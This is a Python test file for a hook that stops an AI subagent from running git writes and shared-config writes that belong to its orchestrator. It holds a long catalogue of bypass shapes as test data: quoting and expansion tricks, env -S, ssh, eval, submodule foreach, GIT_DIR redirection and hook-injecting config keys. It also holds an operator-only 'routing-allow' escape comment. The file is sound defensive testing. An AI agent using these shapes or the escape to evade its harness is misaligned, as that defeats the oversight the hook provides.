    assert "could not be determined" in reason and "fail closed" in reason, reason


def test_the_routing_allow_escape_passes_and_is_logged(shared_repo, tmp_path):
    """The escape is auditable: the fire lands in the drop meter (this
    subprocess has no engine to reach) carrying rule and outcome."""
    for cmd in (
        "git commit -m msg # routing-allow: orchestrator sanctioned",
        "git checkout -- x.py  # routing-allow: orchestrator asked me to revert this",
        "git ch$VARckout -- t3.py  # routing-allow: orchestrator sanctioned this rephrase",
    ):
        out = _verdict(cmd, shared_repo)
        assert "permissionDecision" not in out, f"escape did not pass {cmd!r}: {out}"
    log = (tmp_path / "dropped_writes.jsonl").read_text()
    assert '"escape"' in log and "subagent_git_write_requires_orchestrator" in log, log


# ---------------------------------------------------------------------------
# The deny message.
# ---------------------------------------------------------------------------


def test_the_deny_message_gives_the_hand_back_protocol(shared_repo):
    out = _verdict("git checkout -- f.py", shared_repo)
    assert out["permissionDecision"] == "deny"
    reason = out["permissionDecisionReason"]
    low = reason.lower()
    for needle in ("orchestrator commits", "uncommitted", "falsify by comparison", "git show head:", "diff"):
        assert needle in low, f"deny message lost {needle!r}: {reason}"
    # The escape is named for an operator, never handed to the gated agent
    # (nexus-cnzei.2 S8), and the completion wording scopes SendMessage to
    # background agents (C4).
    assert "routing-allow" in reason and "not yours to reach for" in reason, reason
    assert "background" in low and "foreground" in low, reason
    # nexus-7mgnd/0l6zh review: the tool call's cwd decides the worktree
    # exemption, so a cd or `git -C` inside the command must not be read as one.
    assert "cwd of the tool call decides" in low, reason
    assert "`cd <wt>`" in reason and "`git -C <wt>`" in reason, reason
    assert "isolation: worktree" in reason, reason


def test_the_spliced_expansion_deny_names_the_reconstructed_fragment(shared_repo):
    out = _verdict("git re${x}set --hard", shared_repo)
    assert out["permissionDecision"] == "deny"
    assert "reset" in out["permissionDecisionReason"], out["permissionDecisionReason"]


def test_the_config_deny_names_config_and_says_what_stays_allowed(shared_repo):
    out = _verdict("git config core.hooksPath /tmp/x", shared_repo)
    assert out["permissionDecision"] == "deny"
    reason = out["permissionDecisionReason"]
    assert "config" in reason and "--get" in reason and "--list" in reason, reason
    assert "hooksPath" in reason and "user.*" in reason, reason


def test_documented_residual_config_named_by_a_variable_assigned_earlier(shared_repo):
    """A config verb that never appears after `git` in the text (the word was
    assigned on an earlier line, so the text after `git` is `$c`) is the same
    named residual as a variable-held `checkout`: nothing to anchor on."""
    cmd = "c=config; git " + D + "c user.name x"
    assert not _denied(cmd, shared_repo), cmd


def _config_read(repo: pathlib.Path, *args: str) -> str:
    """What the config of *repo* says, read by a plain subprocess (not through
    the hook, which only gates a subagent's Bash tool)."""
    out = subprocess.run(
        ["git", "config", *args], cwd=repo, capture_output=True, text=True, check=False,
    )
    return out.stdout.strip()


#: Config writes that reach state shared with the primary checkout.
_SHARED_CONFIG_WRITES = [
    "git config user.name x",
    "git config core.hooksPath /tmp/x",
    "git config --local core.hooksPath /tmp/x",
    "git config --global user.name x",
    "git config --system core.hooksPath /tmp/x",
    "git config --unset core.hooksPath",
    "git config --file /tmp/x/cfg user.name x",
    "git config set user.name x",
    "git config --worktree user.name --global",
    "git config --worktree --global user.name x",
    "git config --worktree --glo user.name x",
    "git config --worktree --local user.name x",
    "git config --worktree -f /tmp/x/cfg user.name x",
    "git config user.name x --worktree",
    "git -C {primary} config --worktree core.hooksPath /tmp/x",
    "git --git-dir={primary}/.git config --worktree core.hooksPath /tmp/x",
    "git config {--worktree,--global} user.name x",
    "git status; git config user.name x",
    "git commit -m x; git config --global user.name x",
    # nexus-dsr6a confirmation C: a variable that points git at the primary
    # disqualifies the --worktree exemption, as -C and --git-dir do (the write
    # lands in the PRIMARY's config.worktree, which it reads). `cd`/`pushd` into
    # the primary stay a documented limit: the tool call's cwd decides.
    "GIT_DIR={primary}/.git git config --worktree user.name x",
    "env GIT_DIR={primary}/.git git config --worktree user.name x",
    "export GIT_DIR={primary}/.git; git config --worktree user.name x",
    "GIT_COMMON_DIR={primary}/.git git config --worktree user.name x",
    "GIT_WORK_TREE={primary} git config --worktree user.name x",
    # nexus-dsr6a confirmation G: a key that runs code for whoever commits or
    # runs git in that worktree is refused even with --worktree.
    "git config --worktree core.hooksPath /tmp/x",
    "git config --worktree core.hookspath /tmp/x",
    "git config --worktree x.hooksPath /tmp/x",
    "git config --worktree core.fsmonitor /tmp/x",
    "git config --worktree core.sshCommand /tmp/x",
    "git config --worktree include.path /tmp/x",
    "git config --worktree includeIf.gitdir:/x/.path /tmp/x",
    "git config --worktree includeIf.onbranch:main.path /tmp/x",
    "git config --worktree alias.c '!x'",
    "git config --worktree core.editor /tmp/x",
    "git config --worktree gpg.ssh.program /tmp/x",
    "git config --worktree credential.helper /tmp/x",
    "git config --worktree --add core.hooksPath /tmp/x",
    # B-A and B-B reach a worktree as well: the same quote, brace and capture
    # rules apply, whatever the cwd.
    "git -c 'user.name=a b' config user.name x",
    "git -C '' config user.name x",
    "git -C '{primary}/sp ace' config --worktree user.name x",
    "git " + D + "(echo config | cat) user.name x",
    "git " + D + "(echo config | cat) --worktree user.name x",
    "git --config-env=alias.c=CFG c user.name x",
    # nexus-gvg6t: the --worktree key list is an ALLOWLIST. Every key below ran
    # code or redirected what runs, or is simply not on the list, and passed the
    # old denylist.
    "git config --worktree url.https://evil/.insteadOf https://github.com/",
    "git config --worktree url.x.pushInsteadOf y",
    "git config --worktree interactive.diffFilter /tmp/x",
    "git config --worktree mergetool.m.path /tmp/x",
    "git config --worktree difftool.d.path /tmp/x",
    "git config --worktree mergetool.m.cmd /tmp/x",
    "git config --worktree submodule.s.update '!/tmp/x'",
    "git config --worktree remote.origin.uploadpack /tmp/x",
    "git config --worktree remote.origin.receivepack /tmp/x",
    "git config --worktree uploadpack.packObjectsHook /tmp/x",
    "git config --worktree core.worktree /tmp/x",
    "git config --worktree core.bare true",
    "git config --worktree core.attributesFile /tmp/x",
    "git config --worktree core.excludesFile /tmp/x",
    "git config --worktree diff.tool x",
    "git config --worktree merge.tool x",
    "git config --worktree sendemail.smtpServer /tmp/x",
    "git config --worktree some.unknown.key 1",
    "git config --worktree a.b c",
    "git config --worktree user.name.sub x",
    "git config --worktree --unset url.x.insteadOf",
    "git config --worktree -e",
    "git config --worktree --rename-section user usr",
    "git config --worktree --remove-section user",
    "git config --worktree set core.bare true",
    "git config --worktree --type bool core.bare true",
    "git config --worktree --comment c core.bare true",
    # A repository-pointing variable, quoted or not, anywhere in the command.
    "GIT_DIR='{primary}/.git' git config --worktree user.name x",
    'GIT_DIR="{primary}/.git" git config --worktree user.name x',
    "env 'GIT_DIR={primary}/.git' git config --worktree user.name x",
    "git config --worktree user.name x; GIT_COMMON_DIR='{primary}/.git' git status",
    # nexus-gvg6t review B1: a quoted global option before `config`, and one that
    # points git at the primary.
    "git '--git-dir=.git' config user.name x",
    'git "--git-dir=.git" config --global user.name x',
    "git '--git-dir=.git' config core.hooksPath /tmp/evil",
    "git '--work-tree=.' config user.name x",
    "git '--namespace=a' config user.name x",
    'git "--config-env=core.x=FOO" config user.name x',
    "git '--exec-path=/x' config user.name x",
    "git -c user.x=1 '--git-dir=.git' config user.name x",
    "git '--git-dir={primary}/.git' config --worktree user.name x",
    "git '--work-tree={primary}' config --worktree user.name x",
    'git --git-dir"={primary}/.git" config --worktree user.name x',
    # nexus-gvg6t review B3: a quote that hides the `=` of a repository variable
    # still points git at the primary.
    'env GIT_DIR"={primary}/.git" git config --worktree user.name x',
    "env GIT_WORK_TREE'='{primary} git config --worktree user.name x",
    "env GIT_COMMON_DIR'='{primary}/.git git config --worktree user.name x",
    "env G'IT_DIR'={primary}/.git git config --worktree user.name x",
    # nexus-gvg6t review B2 in a worktree
    "echo ''#;git config user.name x",
    # A data string a consumer runs is held to the same rule.
    "git rebase -x 'g''it config user.name x' HEAD~1",
    "ssh localhost 'git config user.name x'",
    "git submodule foreach 'git config --worktree core.hooksPath /tmp/x'",
    # nexus-gvg6t confirm pass D1: `env -S` runs the words it splits.
    "env -S 'git config' user.name x",
    'env -S "git config" --local core.hooksPath /x',
    "env -iS 'git config' user.name x",
    "env --split-string='git config' user.name x",
    # nexus-gvg6t confirm pass D2: a backslash in a double-quoted string a consumer
    # runs. The consumer's shell drops it, so the option letter after it counts.
    'git rebase -x "git -' + BS + BS + 'C . config user.name x" HEAD~1',
    'git submodule foreach "git -' + BS + BS + 'C . config user.name x"',
    'ssh h "git -' + BS + BS + 'C . config user.name x"',
    'watch "git -' + BS + BS + 'C . config user.name x"',
    'git rebase -x "git -' + BS + 'C . config user.name x" HEAD~1',
    'ssh h "git -' + BS + 'C . config user.name x"',
    # nexus-gvg6t confirm pass D3: the quoted program in command position, and the
    # data a consumer runs, still deny from a worktree
    "'git-config' user.name x",
    "{ git-config user.name x; }",
    "ssh localhost 'git-config user.name x'",
    # nexus-13wz1: the residuals of the confirm pass, each denied from a worktree.
    "env -S'git config' user.name x",
    'env -S"git config" --local core.hooksPath /x',
    "env -iS'git config' user.name x",
    "env -S'git config' --worktree core.hooksPath /tmp/x",
    "env -Sgit config user.name x",
    'ssh h "gi' + BS + BS + 't config user.name x"',
    'ssh h "g' + BS + BS + 'it config --global user.name x"',
    "sh -c 'git-config user.name x'",
    'bash -c "git-config user.name x"',
    "eval 'git-config user.name x'",
    # A `cd` into the primary with a QUOTED path: the unquoted form stays the
    # documented limit (the tool call's cwd decides), the quoted one reads as
    # unprovable text, as it did before the tokenizer.
    "cd '{primary}' && git config --worktree user.name x",
    'cd "{primary}" && git config --worktree user.name x',
    "cd '{primary}'; git config --worktree user.name x",
    "pushd '{primary}' && git config --worktree user.name x",
    "cd -P '{primary}' && git config --worktree user.name x",
    "builtin cd '{primary}' && git config --worktree user.name x",
    "git status\ncd '{primary}'\ngit config --worktree user.name x",
    "(cd '{primary}' && git config --worktree user.name x)",
    # `--` ends the options: the key after it is still checked.
    "git config --worktree -- core.hooksPath /tmp/x",
    "git config --worktree -- url.x.insteadOf y",
    "git config -- --worktree user.name x",
    "git config --worktree -- --global user.name x",
    "git config --worktree -- --unset user.name",
    "git config -- user.name x",
]


def test_a_config_write_by_the_main_conversation_passes(shared_repo):
    for cmd in ("git config user.name x", "git config --global user.name x"):
        assert "permissionDecision" not in _verdict(cmd, shared_repo, agent=False), cmd
    assert _denied("git config user.name x", shared_repo)


def test_a_config_write_that_reaches_shared_state_is_denied_in_a_linked_worktree(
    shared_repo, linked_worktree,
):
    """A linked worktree is exempt from the verb scan, not from a config write
    that reaches state the primary reads: a plain `git config` writes the common
    `.git/config` (verified), `--global`/`--system` the whole box, `--local` the
    common file, and `--file` stays denied everywhere. The deny names config
    only, never the exempt verb that shares the line."""
    cmds = [
        c.replace("{primary}", str(shared_repo)) for c in _SHARED_CONFIG_WRITES
    ]
    leaked = _not_denied(cmds, linked_worktree)
    assert not leaked, f"worktree subagent config write(s) NOT denied: {leaked!r}"
    out = _verdict("git commit -m x; git config --global user.name x", linked_worktree)
    reason = out["permissionDecisionReason"]
    assert "(config)" in reason and "(commit" not in reason, reason
    assert "--worktree" in reason, reason
    # nothing was written to the shared config by the probes above (the hook
    # only decides; this pins that the fixture is what the test says it is)
    assert _config_read(shared_repo, "--local", "--get", "user.name") == ""


def test_a_worktree_write_and_every_config_read_pass_in_a_linked_worktree(
    shared_repo, linked_worktree,
):
    """The wanted behaviour is not lost: reads, and `--worktree` writes once
    `extensions.worktreeConfig` is on, pass from a linked worktree, as does
    everything else a worktree owns."""
    allowed = [
        "git config --worktree user.name x",
        "git config --worktree core.sparseCheckout true",
        "git config --worktree --unset user.name",
        "git config --worktree --add user.signingkey ABC",
        "git config --worktree user.name 'a b'",
        "git config --worktree user.name ';x'",
        'git config --worktree user.email "a@b.c"',
        "git config --worktree core.sparseCheckout true",
        "git config --worktree core.sparseCheckoutCone true",
        "git config --worktree commit.gpgsign false",
        "git config --worktree --bool commit.gpgsign false",
        "git config --worktree --type=bool commit.gpgsign false",
        "git config --worktree --unset commit.gpgsign",
        "git config --worktree --replace-all user.name x",
        "git config --worktree USER.NAME x",
        "git config --worktree core.abbrev 12",
        "git config --worktree color.ui never",
        "git config --worktree --comment 'why' user.name x",
        # nexus-gvg6t: quoted text is data in a linked worktree too
        'git commit -m "fix(config): handle x"',
        "git commit -m 'config'",
        'git commit -m "$(cat <<\'EOF\'\nfix(config): handle x\n\nconfig.py reads the config file.\nEOF\n)"',
        'git add f.txt && git commit -m "$(cat <<\'EOF\'\nuse git config here\nEOF\n)"',
        "git commit -q -F - <<'EOF'\ntalk about git config user.name\nEOF",
        'git grep "config"',
        'git log --grep="config" --oneline',
        "git config --get user.name # config",
        "git config user.name # why",
        "git status; git config --worktree user.name x",
        "git config --get user.name || echo \"no name\"",
        "git config --get user.name",
        "git config user.name",
        "git config --global --get user.name",
        "git config --list",
        "git config --local --get remote.origin.url",
        "git config get 'user.name'",
        # nexus-gvg6t confirm pass D3: the quoted NAME `git-config` is an argument
        'git commit -m "git-config" -m "git-config"',
        'git commit -m "git-config is documented"',
        'git log --grep="git-config" --oneline',
        'grep -rn "git-config" docs/ src/',
        'rg -n "git-config" docs src',
        'find . -name "git-config*" -type f',
        'git grep -n "git-config" -- docs',
        'gh pr create --title "git-config" --body "x"',
        'echo "git-config is documented"',
        # nexus-13wz1: `--` ends the options, so the key after it is the key;
        # the same write passes with and without it
        "git config --worktree -- user.name x",
        "git config --worktree --unset -- user.name",
        "git config --worktree --add -- user.signingkey ABC",
        "git config --worktree --bool -- commit.gpgsign false",
        # an unquoted `cd` (the documented limit: the tool call's cwd decides)
        "cd src && git config --worktree user.name x",
        # nexus-13wz1: dashed prose in a quoted data argument is not a program
        "echo 'git-config user.name x'",
        "echo 'git-config --global user.name x'",
        "printf '%s\\n' 'git-config user.name x'",
        "env -S'git log' --oneline",
        "env -Sgit log --oneline",
        # env without -S runs no split string
        "env FOO=1 git log",
        "env -i git status",
        "env -i FOO=1 git log --oneline -n 1",
        "git commit -m x",
        "git checkout -- f.txt",
        "git diff -- src/config.py | sort",
    ]
    leaked = _denied_among(allowed, linked_worktree)
    assert not leaked, f"worktree command(s) wrongly denied: {leaked!r}"


def test_git_refuses_a_worktree_write_without_the_extension_so_it_cannot_reach_the_primary(
    shared_repo, linked_worktree,
):
    """Why `--worktree` is the one write a linked worktree may make: with
    `extensions.worktreeConfig` unset git refuses it in a repo that has linked
    worktrees (measured on git 2.53), and with it set the write lands in the
    per-worktree file. Either way the common config the primary reads is
    untouched. Run for real (plain subprocesses, not the hook) so the guard's
    premise is measured, not assumed; the plain write is the control."""
    refused = subprocess.run(
        ["git", "config", "--worktree", "zz.probe", "1"], cwd=linked_worktree,
        capture_output=True, text=True,
    )
    assert refused.returncode != 0 and "worktreeConfig" in refused.stderr, refused.stderr
    assert _config_read(shared_repo, "--local", "--get", "zz.probe") == ""
    subprocess.run(
        ["git", "config", "extensions.worktreeConfig", "true"], cwd=shared_repo, check=True,
    )
    subprocess.run(
        ["git", "config", "--worktree", "zz.probe", "1"], cwd=linked_worktree, check=True,
    )
    assert _config_read(shared_repo, "--local", "--get", "zz.probe") == ""
    assert _config_read(linked_worktree, "--worktree", "--get", "zz.probe") == "1"
    subprocess.run(["git", "config", "zz.plain", "1"], cwd=linked_worktree, check=True)
    assert _config_read(shared_repo, "--local", "--get", "zz.plain") == "1"


def _sandbox_env(box: pathlib.Path) -> dict[str, str]:
    """An environment in which a config write can reach only *box*: its own HOME
    and global file, no system file."""
    home = box / "home"
    home.mkdir(parents=True, exist_ok=True)
    return {
        "PATH": os.environ["PATH"], "HOME": str(home),
        # NOSYSTEM stops git READING the system file; GIT_CONFIG_SYSTEM is what
        # keeps a --system WRITE out of /etc/gitconfig when this runs as root.
        "GIT_CONFIG_GLOBAL": str(home / "gitconfig"), "GIT_CONFIG_NOSYSTEM": "1",
        "GIT_CONFIG_SYSTEM": str(home / "systemconfig"),
        "GIT_AUTHOR_NAME": "a", "GIT_AUTHOR_EMAIL": "a@a",
        "GIT_COMMITTER_NAME": "a", "GIT_COMMITTER_EMAIL": "a@a",
    }


def test_the_real_git_sandbox_keeps_global_and_system_writes_in_the_box(tmp_path):
    """The deny tables in this file hold --global/--system commands as DATA, and
    test_no_git_config_global_writes_lint exempts this file on that condition: any
    real git run here goes through _sandbox_env, so a --global or --system write
    lands in the sandbox, never in the host's ~/.gitconfig or /etc/gitconfig."""
    env = _sandbox_env(tmp_path / "box")
    for scope in ("--global", "--system"):
        subprocess.run(
            ["git", "config", scope, "zz.probe", "1"],
            env=env, check=True, capture_output=True, cwd=tmp_path,
        )
    home = tmp_path / "box" / "home"
    assert "probe" in (home / "gitconfig").read_text()
    assert "probe" in (home / "systemconfig").read_text()


def _config_snapshot(paths: list[pathlib.Path]) -> dict[str, str | None]:
    return {str(p): p.read_text() if p.is_file() else None for p in paths}


#: Commands in the new deny families that a real git does NOT turn into a
#: config write (the guard denies them anyway: they are the same shapes), each
#: with the reason, so the real-git test below is not vacuous for the rest.
_NOT_REAL_WRITES = {
    # The expansion yields the one word `config;`, which is no git command.
    "git " + D + "{x:-config;} user.name x": "semicolon is part of the word",
    # `-c 'a b=c'` is an invalid key, git stops before the subcommand.
    "git -c 'a b=c' config user.name x": "invalid -c key",
    # A leading space makes the alias value ` config`, which git does not run.
    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.c GIT_CONFIG_VALUE_0=' config' git c user.name x": "space",
    # No CFG variable is set: the alias has an empty value (the next test sets it).
    "git --config-env alias.c=CFG c user.name x": "CFG unset",
    "git --config-env=ALIAS.c=CFG c user.name x": "CFG unset",
    "git -c alias.c=" + D + "CFG c user.name x": "CFG unset",
    # nexus-gvg6t review B1: the first dies on the unset FOO, the second writes the
    # sandbox's global file, which the watch does not cover.
    'git "--config-env=core.x=FOO" config user.name pwned': "FOO unset",
    "git '--git-dir=.git' config --global user.name pwned": "global file",
    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.c GIT_CONFIG_VALUE_0=" + D + "CFG git c user.name x": "CFG unset",
}
_REAL_WRITE_FAMILIES = (
    "config_global_option_values", "config_substitution_payload", "config_alias_injection",
    "config_quoted_global_option_before_config",
    "config_glued_empty_string_is_not_a_comment_start",
    "config_env_split_string_is_a_consumer",
)


def test_every_config_deny_family_command_really_writes_config(tmp_path):
    """The new deny families are not hypothetical: each command, run for real in
    a sandbox, changes a config file (the repo's, or the other repository a `-C`
    names), and the hook denies it. The ones git itself turns into no write are
    listed with a reason and still must deny."""
    ran = 0
    for family in _REAL_WRITE_FAMILIES:
        for template in _DENY_FAMILIES[family]:
            box = tmp_path / f"box{ran}"
            main = box / "main"
            main.mkdir(parents=True)
            env = _sandbox_env(box)
            subprocess.run(["git", "init", "-q"], cwd=main, check=True, env=env)
            watched = [main / ".git" / "config"]
            for name in ("sp ace", "se;mi"):
                (main / name).mkdir()
                subprocess.run(["git", "init", "-q"], cwd=main / name, check=True, env=env)
                watched.append(main / name / ".git" / "config")
            cmd = template.replace("{repo}", str(main))
            before = _config_snapshot(watched)
            subprocess.run(
                ["bash", "-c", cmd], cwd=main, env=env, capture_output=True, text=True,
                check=False, timeout=20,
            )
            wrote = _config_snapshot(watched) != before
            if template in _NOT_REAL_WRITES:
                assert not wrote, f"{template!r} was listed as not a write but wrote"
            else:
                assert wrote, f"[{family}] {template!r} did not change any config file"
            assert _denied(cmd, main), f"[{family}] {template!r} was not denied"
            ran += 1
    assert ran >= 40, f"only {ran} commands were run; the families shrank"


def test_the_config_alias_through_a_variable_really_writes_and_denies(tmp_path):
    """D with the variable actually set: `CFG=config git --config-env=alias.c=CFG
    c user.name x` and the exported form write, and both deny."""
    cmds = [
        "CFG=config git --config-env=alias.c=CFG c user.name x",
        "export CFG=config; git --config-env alias.c=CFG c user.name x",
        "export CFG=config; git -c alias.c=" + D + "CFG c user.name x",
    ]
    for i, cmd in enumerate(cmds):
        box = tmp_path / f"d{i}"
        main = box / "main"
        main.mkdir(parents=True)
        env = _sandbox_env(box)
        subprocess.run(["git", "init", "-q"], cwd=main, check=True, env=env)
        cfg = main / ".git" / "config"
        before = cfg.read_text()
        subprocess.run(["bash", "-c", cmd], cwd=main, env=env, capture_output=True, text=True, timeout=20)
        assert cfg.read_text() != before, f"{cmd!r} did not write"
        assert _denied(cmd, main), cmd


def test_a_quoted_command_a_consumer_runs_really_writes_and_denies(tmp_path):
    """nexus-gvg6t: quoted text is data to the shell that reads it, not to a
    consumer that runs its argument. `git submodule foreach '<cmd>'` runs <cmd>
    in each submodule, so a quoted `git config` writes the submodule's config for
    real. The control, the same quoted text as an `echo` argument, writes nothing
    and passes."""
    box = tmp_path / "box"
    env = _sandbox_env(box)
    sub = box / "sub"
    main = box / "main"
    for repo in (sub, main):
        repo.mkdir(parents=True)
        subprocess.run(["git", "init", "-q"], cwd=repo, check=True, env=env)
    (sub / "f").write_text("x")
    subprocess.run(["git", "add", "f"], cwd=sub, check=True, env=env)
    subprocess.run(["git", "commit", "-qm", "i"], cwd=sub, check=True, env=env)
    subprocess.run(
        ["git", "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(sub), "s"],
        cwd=main, check=True, env=env, capture_output=True,
    )
    watched = [main / ".git" / "modules" / "s" / "config", main / ".git" / "config"]
    control = "git submodule foreach 'echo git config user.name via-foreach'"
    before = _config_snapshot(watched)
    subprocess.run(["bash", "-c", control], cwd=main, env=env, check=True, capture_output=True)
    assert _config_snapshot(watched) == before, "the control wrote"
    assert not _denied(control.replace("echo git config user.name via-foreach", "echo ok"), main)
    for cmd in (
        "git submodule foreach 'git config user.name via-foreach'",
        'git submodule foreach "git config core.hooksPath /tmp/hk"',
        "git submodule foreach 'g''it config user.name via-split'",
        "git submodule foreach 'gi\"\"t config user.name via-split2'",
        "git submodule foreach \"gi''t config user.name via-split3\"",
    ):
        before = _config_snapshot(watched)
        subprocess.run(["bash", "-c", cmd], cwd=main, env=env, check=True, capture_output=True)
        assert _config_snapshot(watched) != before, f"{cmd!r} did not write"
        assert _denied(cmd, main), cmd


def test_a_backslash_in_a_double_quoted_consumer_string_really_writes_and_denies(tmp_path):
    """nexus-gvg6t confirm pass D2, measured. The shell turns two backslashes in
    double quotes into one; the consumer's own shell drops a backslash before an
    ordinary letter, so `git -BSBSC . config ...` runs as `git -C . config ...`.
    Each command below, run for real, changes a config file, and the hook denies
    it from a LINKED WORKTREE (where the verb scan does not apply, so the config
    rule alone decides). `ssh` and `watch` are stubs that run their arguments in
    `sh -c`, as the real ones do on the far side. The read-only control writes
    nothing and passes."""
    box = tmp_path / "box"
    env = _sandbox_env(box)
    stubs = box / "stubs"
    stubs.mkdir(parents=True)
    (stubs / "ssh").write_text('#!/bin/sh\nshift\nexec sh -c "$*"\n')
    (stubs / "watch").write_text('#!/bin/sh\nexec sh -c "$*"\n')
    for name in ("ssh", "watch"):
        (stubs / name).chmod(0o755)
    env["PATH"] = f"{stubs}{os.pathsep}{env['PATH']}"
    sub = box / "sub"
    main = box / "main"
    for repo in (sub, main):
        repo.mkdir(parents=True)
        subprocess.run(["git", "init", "-q"], cwd=repo, check=True, env=env)
        (repo / "f").write_text("x")
        subprocess.run(["git", "add", "f"], cwd=repo, check=True, env=env)
        subprocess.run(["git", "commit", "-qm", "one"], cwd=repo, check=True, env=env)
        (repo / "f").write_text("xy")
        subprocess.run(["git", "commit", "-qam", "two"], cwd=repo, check=True, env=env)
    subprocess.run(
        ["git", "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(sub), "s"],
        cwd=main, check=True, env=env, capture_output=True,
    )
    subprocess.run(["git", "commit", "-qm", "sm"], cwd=main, check=True, env=env)
    wt = box / "wt"
    subprocess.run(
        ["git", "worktree", "add", "-q", "-b", "wtb", str(wt)], cwd=main, check=True, env=env,
    )
    common = main / ".git" / "config"
    sm_config = main / ".git" / "modules" / "s" / "config"
    dq = '"git -' + BS + BS + 'C . config user.name {v}"'
    one = '"git -' + BS + 'C . config user.name {v}"'
    cases = [
        # (command, where it runs, the file it must change)
        ("git rebase -x " + dq.format(v="rb") + " HEAD~1", wt, common),
        ("ssh h " + dq.format(v="ssh"), wt, common),
        ("watch " + dq.format(v="watch"), wt, common),
        ("git rebase -x " + one.format(v="rb1") + " HEAD~1", wt, common),
        ("ssh h " + one.format(v="ssh1"), wt, common),
        ("git submodule foreach " + dq.format(v="sub"), main, sm_config),
        ("git submodule foreach " + one.format(v="sub1"), main, sm_config),
    ]
    for cmd, where, watched in cases:
        before = _config_snapshot([watched])
        subprocess.run(
            ["bash", "-c", cmd], cwd=where, env=env, capture_output=True, text=True,
            check=False, timeout=60,
        )
        assert _config_snapshot([watched]) != before, f"{cmd!r} did not write"
        assert _denied(cmd, wt), f"{cmd!r} was not denied in a linked worktree"
    control = "ssh h " + dq.format(v="x").replace("config user.name x", "config --get user.name")
    before = _config_snapshot([common])
    subprocess.run(["bash", "-c", control], cwd=wt, env=env, capture_output=True, check=False)
    assert _config_snapshot([common]) == before, "the control wrote"
    assert not _denied(control, wt), control


def test_the_nexus_13wz1_residuals_really_write_and_deny_from_a_linked_worktree(tmp_path):
    """The confirm-pass residuals, measured. Each command, run for real in a
    sandbox, changes the common config the primary reads, and the hook denies it
    from a LINKED WORKTREE (where only the config rule decides). `ssh` stubs the
    far side with `sh -c`; `git-config` is a stub on PATH, as git-core's is on a
    box that has it there. The controls (a read through the same shapes, and the
    prose that only names the program) write nothing and pass. The `cd` into the
    primary writes the primary's per-worktree file, which the primary reads: it
    is run to show the unquoted form is the documented limit and the quoted one
    is denied."""
    box = tmp_path / "box"
    env = _sandbox_env(box)
    stubs = box / "stubs"
    stubs.mkdir(parents=True)
    (stubs / "ssh").write_text('#!/bin/sh\nshift\nexec sh -c "$*"\n')
    (stubs / "git-config").write_text('#!/bin/sh\nexec git config "$@"\n')
    for name in ("ssh", "git-config"):
        (stubs / name).chmod(0o755)
    env["PATH"] = f"{stubs}{os.pathsep}{env['PATH']}"
    main = box / "main"
    main.mkdir(parents=True)
    subprocess.run(["git", "init", "-q"], cwd=main, check=True, env=env)
    (main / "f").write_text("x")
    subprocess.run(["git", "add", "f"], cwd=main, check=True, env=env)
    subprocess.run(["git", "commit", "-qm", "one"], cwd=main, check=True, env=env)
    wt = box / "wt"
    subprocess.run(
        ["git", "worktree", "add", "-q", "-b", "wtb", str(wt)], cwd=main, check=True, env=env,
    )
    common = main / ".git" / "config"
    writes = [
        "env -S'git config' user.name via-env",
        'env -S"git config" user.name via-env2',
        "env -S'git config user.name via-env3'",
        "env -S'git' config user.name via-env4",
        "env -Sgit config user.name via-env5",
        "env -S'git config' core.hooksPath /tmp/hk",
        'ssh h "gi' + BS + BS + 't config user.name via-ssh"',
        'ssh h "g' + BS + BS + 'it config core.hooksPath /tmp/hk2"',
        "sh -c 'git-config user.name via-sh'",
        'bash -c "git-config core.hooksPath /tmp/hk3"',
        "eval 'git-config user.name via-eval'",
    ]
    for cmd in writes:
        before = _config_snapshot([common])
        run = subprocess.run(
            ["bash", "-c", cmd], cwd=wt, env=env, capture_output=True, text=True,
            check=False, timeout=60,
        )
        assert _config_snapshot([common]) != before, f"{cmd!r} did not write: {run.stderr}"
        assert _denied(cmd, wt), f"{cmd!r} was not denied in a linked worktree"
    controls = [
        "env -S'git config' --get user.name",
        "env -S'git log' --oneline",
        "echo 'git-config user.name x'",
        "printf '%s\\n' 'git-config user.name x'",
    ]
    for cmd in controls:
        before = _config_snapshot([common])
        subprocess.run(
            ["bash", "-c", cmd], cwd=wt, env=env, capture_output=True, text=True,
            check=False, timeout=60,
        )
        assert _config_snapshot([common]) == before, f"control {cmd!r} wrote"
        assert not _denied(cmd, wt), f"control {cmd!r} was wrongly denied"
    # `--worktree --`: with the extension on, the write lands in the worktree's
    # own file and never in the common one, so the allowlisted key passes.
    subprocess.run(
        ["git", "config", "extensions.worktreeConfig", "true"], cwd=main, check=True, env=env,
    )
    before = _config_snapshot([common])
    cmd = "git config --worktree -- user.name via-dashdash"
    subprocess.run(["bash", "-c", cmd], cwd=wt, env=env, check=True, capture_output=True)
    assert _config_snapshot([common]) == before, "`--worktree --` wrote the common config"
    out = subprocess.run(
        ["git", "config", "--worktree", "--get", "user.name"], cwd=wt, env=env,
        capture_output=True, text=True, check=True,
    )
    assert out.stdout.strip() == "via-dashdash"
    assert not _denied(cmd, wt), cmd
    # `cd` into the primary: the quoted forms deny. The unquoted form is the
    # documented limit (the tool call's cwd, not the text, names the checkout).
    for quoted in (f"cd '{main}' && git config --worktree user.name via-cd",
                   f'cd "{main}" && git config --worktree user.name via-cd'):
        assert _denied(quoted, wt), quoted
    assert not _denied(f"cd {main} && git config --worktree user.name via-cd", wt)


def test_a_worktree_commit_denied_for_a_config_word_says_to_reword_it(
    shared_repo, linked_worktree,
):
    """nexus-gvg6t: a commit message the tokenizer cannot read (a `$(date)` beside
    the word `config`) still denies in a linked worktree; the deny tells the agent
    to reword it or pass it with -F, not to hand the commit back."""
    cmd = 'git commit -m "fix(config): ' + D + '(date)"'
    out = _verdict(cmd, linked_worktree)
    assert out["permissionDecision"] == "deny", cmd
    reason = out["permissionDecisionReason"]
    assert "reword the message, or pass it with `git commit -F <file>`" in reason, reason
    plain = _verdict("git config user.name x", shared_repo)["permissionDecisionReason"]
    assert "reword the message" not in plain, "the primary checkout deny must not say it"
    assert _denied(cmd, linked_worktree)
    assert not _denied("git commit -F msg.txt", linked_worktree)


def test_a_git_dir_assignment_really_redirects_a_worktree_write_into_the_primary(
    shared_repo, linked_worktree, tmp_path,
):
    """C, measured: with `extensions.worktreeConfig` on, `GIT_DIR=<primary>/.git
    git config --worktree user.name x` run from the linked worktree writes the
    PRIMARY's `config.worktree`, which the primary reads. The plain --worktree
    write is the control: it lands in the worktree's own file and passes."""
